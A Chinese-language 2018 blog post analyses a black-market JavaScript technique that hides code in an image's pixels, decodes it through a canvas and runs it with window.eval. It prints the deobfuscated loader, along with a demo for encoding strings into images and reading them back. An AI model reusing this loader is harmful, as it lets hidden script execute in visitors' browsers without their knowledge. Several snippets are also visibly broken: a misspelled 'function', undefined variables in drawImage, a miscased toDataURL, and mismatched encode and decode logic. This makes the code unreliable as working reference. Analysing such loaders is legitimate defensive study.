---
title: "黑产代码解密--利用canvas加载代码"
author: Neal
description: ""
tags: [canvas,前端开发,安全]
categories: [web security]
date: "2018-08-12"
---

前段时间获取到黑产的一些代码，不得不感叹黑产的代码是在写的是好得很，思路巧妙，环环相扣。不得不说，技术不好，黑产都做不了了。虽然分析了好多天，但是也只是一知半解。这里抽出一小部分来讲一下。二话不说，先上代码：

最初的代码是经过混淆的，代码经过整理如下：

```javascript
var createImgElement = function(urla, b) {
    var imgElement = document.createElement('img');
    var canvasEle = document.createElement('canvas');
    imgElement['crossOrigin'] = true;
    imgElement['onload'] = function() {
        canvasEle.width = this.width;
        canvasEle.height = this.height;
        var canvasContext = canvasEle.getContext('2d')
        canvasContext.drawImage(this, 0, 0, this.width, this.height);
        for (var canvasContext = canvasContext.getImageData(0, 0, this.width, this.height), 
        cancasDataLength = canvasContext.data.length, arr = [], i = 0;
            i < cancasDataLength;
            i += 4) {
            var code = canvasContext.data[i]
            var code1 = canvasContext.data[i + 1]
            var code2 = canvasContext.data[i + 2]
            canvasContext.data[i + 2].toString(16);
            1 == code1.length && (code1 = 0 + code1);
            1 == code2.length && (code2 = 0 + code2);
            0 != Number(code + code1 + code2) && arr.push(String.fromCharCode(Number(code + code1 + code2)))
        }
        window.eval(arr.join(''));
        console.log(arr.join(''))
        b && b()
    }
    imgElement.src = urla
};
```

这段代码的主要目的是通过使用一个图片的连接，将这个图片加载到 canvas 中，再利用 canvas 去获取恶意代码并执行。通过图片去隐藏信息是一种常见的做法，这段就是通过 canvas 去执行图片中隐含的恶意代码。这段还支持传入回调函数，若回调函数存在，则执行回调函数。

这里涉及到一个 canvas 和图片之间的相互转化。下面提供两个相互转化的函数：

```javascript
var canvasToImg = fucntion(image) {
    var canvas = document.createElement('canvas');
    canvas.width = image.width;
    canvas.height = image.height;
    canvas.getContext('2d').drawImage(image, width, height);
    return canvas;
}

var imgToCanvas = function(canvas) {
    var image = new Image();
    image.src = canvas.toDataUrl('image/png');
    return image;
}
```

所以黑产也是通过将恶意代码放入到图片之中，从而以后可以通过 canvas 去读取恶意代码。下面写一个小的 demo 来复现这样一个简单的过程：

```javascript
var createImgByCode = function(codeStr, width, height) {
    var imgElement = document.createElement('img');
    var canvasEle = document.createElement('canvas');
    canvasEle.width = width;
    canvasEle.height = height;
    var canvasContext = canvasEle.getContext('2d');
    var data = new Array(4 * width * height);
    for (var i = 0; i < codeStr.length; i += 4) {
        var c = codeStr[i];
        var charCode = c.charCodeAt();
        var code = 0;
        var code1 = 16;
        var code2 = charCode - code1;
        data[i] = code;
        data[i + 1] = code1;
        data[i + 2] = code2;
        data[i + 3] = 255;
    }
    data = Uint8ClampedArray.from(data);
    var imgData = new ImageData(data, width, height);
    canvasContext.putImageData(imgData, 0, 0);
    imgElement.src = canvasEle.toDataURL("image/png");
    imgElement.width = width;
    imgElement.height = height;
    imgElement.crossOrigin = ' ';
    document.querySelector("#container").appendChild(imgElement);
}

var readCodeFromImg = function() {
    var img = document.querySelector('#container img');
    var width = 20;
    var height = 20;
    var canvas = document.createElement('canvas');
    canvas.width = width;
    canvas.height = height;
    var context = canvas.getContext('2d');
    context.drawImage(img, 0, 0, width, height);
    for (var context = context.getImageData(0, 0, width, height), 
        cancasDataLength = context.data.length, arr = [], i = 0;
        i < cancasDataLength;
        i += 4) {
        var code = context.data[i];
        var code1 = context.data[i + 1];
        var code2 = context.data[i + 2];
        1 == code1.length && (code1 = 0 + code1);
        1 == code2.length && (code2 = 0 + code2);
        0 != Number(code + code1 + code2) && arr.push(String.fromCharCode(Number(code + code1 + code2)))
    }
    console.log(arr.join(''));
}

createImgByCode("14324dfjkkdf432473724afjdfshjkdfkl53453453425dlkfklsdf", 20, 20);
readCodeFromImg();
```

`createImgByCode` 函数可以将任意字符串转化为一个图片，接着通过 canvas 去加载代码。不过这里面有一个问题，就是通过`createImgByCode` 函数生成的图片是一个 base64 图片，不能够直接被加载，这个图片必须被存储为 png 格式才能够通过另一个函数去加载代码。

以上。

欢迎搜索微信号 mad_coder 或者扫描二维码关注公众号：

![9tMvlT.jpg](https://s1.ax1x.com/2018/02/17/9tMvlT.jpg)

